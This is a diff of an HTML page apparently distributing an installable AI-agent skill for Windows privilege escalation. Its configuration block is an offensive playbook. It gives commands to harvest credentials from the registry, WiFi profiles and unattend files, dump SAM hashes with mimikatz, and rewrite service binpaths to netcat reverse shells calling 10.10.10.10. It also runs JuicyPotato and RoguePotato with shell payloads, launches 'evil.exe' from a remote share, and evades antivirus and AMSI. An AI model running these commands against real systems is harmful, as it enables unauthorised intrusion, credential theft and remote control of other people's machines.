@@ -4,63 +4,113 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>windows-privilege-escalation - AICCLI</title>
-  <meta name="description" content="windows-privilege-escalation - Claude Code skill for AICCLI">
+  <meta name="description" content="This skill should be used when the user asks to "escalate privileges on Windows," "find Windows privesc vectors," "enumerate Windows for privilege escalation," ">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg-dark: #0a0a0f;
-      --glass-bg: rgba(255, 255, 255, 0.03);
-      --glass-border: rgba(255, 255, 255, 0.08);
-      --text-primary: #ffffff;
-      --text-secondary: #a0a0b0;
-      --text-muted: #606070;
-      --accent: #a855f7;
-      --accent-glow: rgba(168, 85, 247, 0.3);
-      --cyan: #22d3ee;
-    }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Space Grotesk', sans-serif; background: var(--bg-dark); color: var(--text-primary); min-height: 100vh; }
-    body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(ellipse at 20% 20%, rgba(168, 85, 247, 0.15) 0%, transparent 50%), radial-gradient(ellipse at 80% 80%, rgba(34, 211, 238, 0.1) 0%, transparent 50%); pointer-events: none; z-index: -1; }
-    header { position: sticky; top: 0; z-index: 100; backdrop-filter: blur(20px); border-bottom: 1px solid var(--glass-border); background: rgba(10, 10, 15, 0.8); }
-    .header-content { max-width: 1400px; margin: 0 auto; padding: 16px 20px; display: flex; align-items: center; gap: 20px; }
-    .logo-link { display: flex; align-items: center; gap: 12px; text-decoration: none; }
-    .logo { width: 40px; height: 40px; border-radius: 10px; border: 2px solid var(--accent); }
-    .brand { font-size: 24px; font-weight: 700; color: var(--accent); letter-spacing: -1px; }
-    .breadcrumb { margin-left: auto; color: var(--text-secondary); font-size: 14px; }
-    .breadcrumb a { color: var(--text-secondary); text-decoration: none; }
-    .breadcrumb a:hover { color: var(--accent); }
-    .container { max-width: 1400px; margin: 0 auto; padding: 40px 20px; }
-    .card { background: var(--glass-bg); border: 1px solid var(--glass-border); border-radius: 20px; padding: 32px; backdrop-filter: blur(20px); margin-bottom: 30px; }
-    h1 { font-size: 36px; margin-bottom: 16px; letter-spacing: -1px; background: linear-gradient(135deg, var(--accent), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .meta { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 24px; }
-    .meta-item { padding: 8px 16px; background: rgba(168, 85, 247, 0.15); border: 1px solid var(--accent); border-radius: 20px; font-size: 13px; color: var(--accent); }
-    .content-section h2 { font-size: 20px; margin: 24px 0 16px; color: var(--text-primary); }
-    pre { background: rgba(0, 0, 0, 0.4); border: 1px solid var(--glass-border); border-radius: 16px; padding: 24px; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 14px; line-height: 1.6; color: var(--text-secondary); white-space: pre-wrap; word-wrap: break-word; }
-    code { background: rgba(168, 85, 247, 0.15); padding: 2px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; color: var(--cyan); }
-    .description { font-size: 16px; color: var(--text-secondary); line-height: 1.7; margin-bottom: 24px; }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Inter',sans-serif;background:#fafafa;color:#1a1a1a;line-height:1.6}
+    .container{max-width:900px;margin:0 auto;padding:0 24px}
+    header{background:#fff;border-bottom:1px solid #e5e5e5;position:sticky;top:0;z-index:100;padding:12px 0}
+    header .container{display:flex;align-items:center;justify-content:space-between}
+    .logo{display:flex;align-items:center;gap:10px;text-decoration:none}
+    .logo img{width:32px;height:32px;border-radius:6px}
+    .logo span{font-size:18px;font-weight:700;color:#1a1a1a}
+    .nav{display:flex;gap:8px}
+    .nav a{padding:8px 16px;border-radius:6px;text-decoration:none;color:#666;font-size:14px;font-weight:500;transition:all .2s}
+    .nav a:hover{background:#f5f5f5;color:#1a1a1a}
+    .breadcrumb{padding:24px 0 0;font-size:14px;color:#888}
+    .breadcrumb a{color:#666;text-decoration:none}
+    .breadcrumb a:hover{color:#1a1a1a}
+    .content{padding:32px 0 64px}
+    .header{display:flex;align-items:flex-start;gap:20px;margin-bottom:32px}
+    .icon{width:64px;height:64px;background:#f5f5f5;border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0}
+    .title{flex:1}
+    .title h1{font-size:32px;font-weight:700;margin-bottom:8px}
+    .title .meta{display:flex;gap:12px;flex-wrap:wrap}
+    .badge{padding:6px 12px;background:#f5f5f5;border-radius:6px;font-size:13px;color:#666}
+    .badge.type{background:#e8f4ff;color:#0066cc}
+    .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
+    .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
+    .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
+    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
+    .copy-btn:hover{background:#f5f5f5}
+    pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
+    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
+    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
+    .how-to ol{margin:16px 0;padding-left:24px}
+    .how-to li{margin-bottom:12px;color:#444}
+    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
+    .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+    .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
+    .stats{display:flex;gap:24px;margin-top:20px;padding-top:20px;border-top:1px solid #e5e5e5}
+    .stat{text-align:center}
+    .stat strong{display:block;font-size:24px;font-weight:600;color:#1a1a1a}
+    .stat span{font-size:12px;color:#888}
+    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
   </style>
 </head>
 <body>
   <header>
-    <div class="header-content">
-      <a href="../index.html" class="logo-link"><img src="../logo.png" alt="AICCLI" class="logo"><span class="brand">AICCLI</span></a>
-      <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="../skill.html">Skill</a> / windows-privilege-escalation</div>
+    <div class="container">
+      <a href="index.html" class="logo"><img src="logo.png" alt="AICCLI"><span>AICCLI</span></a>
+      <nav class="nav">
+        <a href="index.html">Components</a>
+        <a href="docs.html">Docs</a>
+        <a href="install.html">Install</a>
+      </nav>
     </div>
   </header>
+
   <div class="container">
-    <div class="card">
-      <h1>windows-privilege-escalation</h1>
-      <div class="meta">
-        <span class="meta-item">Skill</span>
-        <span class="meta-item">security</span>
+    <div class="breadcrumb">
+      <a href="index.html">Home</a> / <a href="index.html">skills</a> / security / windows-privilege-escalation
+    </div>
+  </div>
+
+  <main class="container content">
+    <div class="header">
+      <div class="icon">⚡</div>
+      <div class="title">
+        <h1>windows-privilege-escalation</h1>
+        <div class="meta">
+          <span class="badge type">Skill</span>
+          <span class="badge">security</span>
+          
+        </div>
       </div>
-      <div class="description"><pre>---
+    </div>
+
+    <p class="desc">This skill should be used when the user asks to "escalate privileges on Windows," "find Windows privesc vectors," "enumerate Windows for privilege escalation," "exploit Windows misconfigurations," or "perform post-exploitation privilege escalation." It provides comprehensive guidance for discovering and exploiting privilege escalation vulnerabilities in Windows environments.</p>
+
+    <div class="section">
+      <h2>How to Use</h2>
+      <div class="how-to">
+        <ol>
+          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/windows-privilege-escalation</code> in your terminal</li>
+          <li><strong>Or with OpenCode:</strong> Run <code>opencode install skills/windows-privilege-escalation</code></li>
+          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
+        </ol>
+        
+        <div class="install-box">
+          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+          <p>Installation Command:</p>
+          <code id="install-cmd">npx aiccli install skills/windows-privilege-escalation</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>Configuration</h2>
+      <pre id="config"><code>---
 name: Windows Privilege Escalation
-description: This skill should be used when the user asks to "escalate privileges on Windows," "find Windows privesc vectors," "enumerate Windows for privilege escalation," "exploit Windows misconfigurations," or "perform post-exploitation privilege escalation." It provides comprehensive guidance for discovering and exploiting privilege escalation vulnerabilities in Windows environments.
+description: This skill should be used when the user asks to &quot;escalate privileges on Windows,&quot; &quot;find Windows privesc vectors,&quot; &quot;enumerate Windows for privilege escalation,&quot; &quot;exploit Windows misconfigurations,&quot; or &quot;perform post-exploitation privilege escalation.&quot; It provides comprehensive guidance for discovering and exploiting privilege escalation vulnerabilities in Windows environments.
 metadata:
   author: zebbern
-  version: "1.1"
+  version: &quot;1.1&quot;
 ---
 
 # Windows Privilege Escalation
@@ -92,7 +142,7 @@ Provide systematic methodologies for discovering and exploiting privilege escala
 #### Basic System Information
 ```powershell
 # OS version and patches
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
 wmic qfe
 
 # Architecture
@@ -198,7 +248,7 @@ mimikatz&gt; lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy
 #### Search for Passwords
 ```powershell
 # Search file contents
-findstr /SI /M "password" *.xml *.ini *.txt
+findstr /SI /M &quot;password&quot; *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 
 # Search registry
@@ -206,13 +256,13 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
 # Windows Autologin credentials
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;
 
 # PuTTY sessions
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;
 
 # VNC passwords
-reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
 # Search for specific files
@@ -233,7 +283,7 @@ C:\Windows\system32\sysprep\sysprep.xml
 dir /s *sysprep.inf *sysprep.xml *unattend.xml 2&gt;nul
 
 # Decode base64 password (Linux)
-echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
+echo &quot;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=&quot; | base64 -d
 ```
 
 #### WiFi Passwords
@@ -245,7 +295,7 @@ netsh wlan show profile
 netsh wlan show profile &lt;SSID&gt; key=clear
 
 # Extract all WiFi passwords
-for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on
+for /f &quot;tokens=4 delims=: &quot; %a in (&#039;netsh wlan show profiles ^| find &quot;Profile &quot;&#039;) do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr &quot;SSID Cipher Key&quot; | find /v &quot;Number&quot; &amp; echo.) &amp; @echo on
 ```
 
 #### PowerShell History
@@ -261,14 +311,14 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 #### Incorrect Service Permissions
 ```powershell
 # Find misconfigured services
-accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-accesschk.exe -uwcqv "Everyone" * /accepteula
+accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula
+accesschk.exe -uwcqv &quot;Everyone&quot; * /accepteula
 accesschk.exe -ucqv &lt;service_name&gt;
 
 # Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
 
 # Exploit vulnerable service
-sc config &lt;service&gt; binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
+sc config &lt;service&gt; binpath= &quot;C:\nc.exe -e cmd.exe 10.10.10.10 4444&quot;
 sc stop &lt;service&gt;
 sc start &lt;service&gt;
 ```
@@ -276,8 +326,8 @@ sc start &lt;service&gt;
 #### Unquoted Service Paths
 ```powershell
 # Find unquoted paths
-wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
-wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot;
+wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;
 
 # Exploit: Place malicious exe in path
 # For path: C:\Program Files\Some App\service.exe
@@ -321,16 +371,16 @@ whoami /priv
 #### Potato Attacks
 ```powershell
 # JuicyPotato (Windows Server 2019 and below)
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe&quot; -t *
 
 # PrintSpoofer (Windows 10 and Server 2019)
 PrintSpoofer.exe -i -c cmd
 
 # RoguePotato
-RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999
+RoguePotato.exe -r 10.10.10.10 -e &quot;C:\nc.exe 10.10.10.10 4444 -e cmd.exe&quot; -l 9999
 
 # GodPotato
-GodPotato.exe -cmd "cmd /c whoami"
+GodPotato.exe -cmd &quot;cmd /c whoami&quot;
 ```
 
 ### 5. Kernel Exploitation
@@ -380,8 +430,8 @@ CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019
 cmdkey /list
 
 # Use saved credentials
-runas /savecred /user:Administrator "cmd.exe /k whoami"
-runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
+runas /savecred /user:Administrator &quot;cmd.exe /k whoami&quot;
+runas /savecred /user:WORKGROUP\Administrator &quot;\\10.10.10.10\share\evil.exe&quot;
 ```
 
 #### WSL Exploitation
@@ -395,7 +445,7 @@ wsl --default-user root
 
 # Spawn shell as root
 wsl whoami
-wsl python -c 'import os; os.system("/bin/bash")'
+wsl python -c &#039;import os; os.system(&quot;/bin/bash&quot;)&#039;
 ```
 
 ## Quick Reference
@@ -426,8 +476,8 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 
 | Vector | Check Command |
 |--------|---------------|
-| Unquoted paths | `wmic service get pathname \| findstr /i /v """` |
-| Weak service perms | `accesschk.exe -uwcqv "Everyone" *` |
+| Unquoted paths | `wmic service get pathname \| findstr /i /v &quot;&quot;&quot;` |
+| Weak service perms | `accesschk.exe -uwcqv &quot;Everyone&quot; *` |
 | AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
 | Stored credentials | `cmdkey /list` |
 | Token privileges | `whoami /priv` |
@@ -470,7 +520,7 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 ### Example 1: Service Binary Path Exploitation
 ```powershell
 # Find vulnerable service
-accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula
 # Result: RW MyService SERVICE_ALL_ACCESS
 
 # Check current config
@@ -478,7 +528,7 @@ sc qc MyService
 
 # Stop service and change binary path
 sc stop MyService
-sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+sc config MyService binpath= &quot;C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;
 sc start MyService
 
 # Catch shell as SYSTEM
@@ -507,7 +557,7 @@ whoami /priv
 # SeImpersonatePrivilege Enabled
 
 # Run JuicyPotato
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe&quot; -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
 
 # Catch SYSTEM shell
 ```
@@ -515,25 +565,25 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc
 ### Example 4: Unquoted Service Path
 ```powershell
 # Find unquoted path
-wmic service get name,pathname | findstr /i /v """
+wmic service get name,pathname | findstr /i /v &quot;&quot;&quot;
 # Result: C:\Program Files\Vuln App\service.exe
 
 # Check write permissions
-icacls "C:\Program Files\Vuln App"
+icacls &quot;C:\Program Files\Vuln App&quot;
 # Result: Users:(W)
 
 # Place malicious binary
-copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"
+copy C:\Users\Public\shell.exe &quot;C:\Program Files\Vuln.exe&quot;
 
 # Restart service
-sc stop "Vuln App"
-sc start "Vuln App"
+sc stop &quot;Vuln App&quot;
+sc start &quot;Vuln App&quot;
 ```
 
 ### Example 5: Credential Harvesting from Registry
 ```powershell
 # Check for auto-logon credentials
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
 # DefaultUserName: Administrator
 # DefaultPassword: P@ssw0rd123
 
@@ -547,12 +597,43 @@ runas /user:Administrator cmd.exe
 | Issue | Cause | Solution |
 |-------|-------|----------|
 | Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
-| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
+| Service won&#039;t start | Binary path syntax | Ensure space after `=` in binpath: `binpath= &quot;C:\path\binary.exe&quot;` |
 | Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
-| Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
-| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc &lt;base64&gt;` |
-</pre></div>
+| Can&#039;t find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
+| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c &quot;cmd&quot;` or `-enc &lt;base64&gt;` |
+</code></pre>
     </div>
-  </div>
+
+    
+
+    <div class="section">
+      <h2>Info</h2>
+      <div class="stats">
+        <div class="stat">
+          <strong>54</strong>
+          <span>Downloads</span>
+        </div>
+        <div class="stat">
+          <strong>1.0</strong>
+          <span>Version</span>
+        </div>
+        <div class="stat">
+          <strong>MIT</strong>
+          <span>License</span>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    function copyConfig() {
+      const config = document.getElementById('config').textContent;
+      navigator.clipboard.writeText(config).then(() => {
+        const btn = document.querySelector('.copy-btn');
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy Config', 2000);
+      });
+    }
+  </script>
 </body>
 </html>
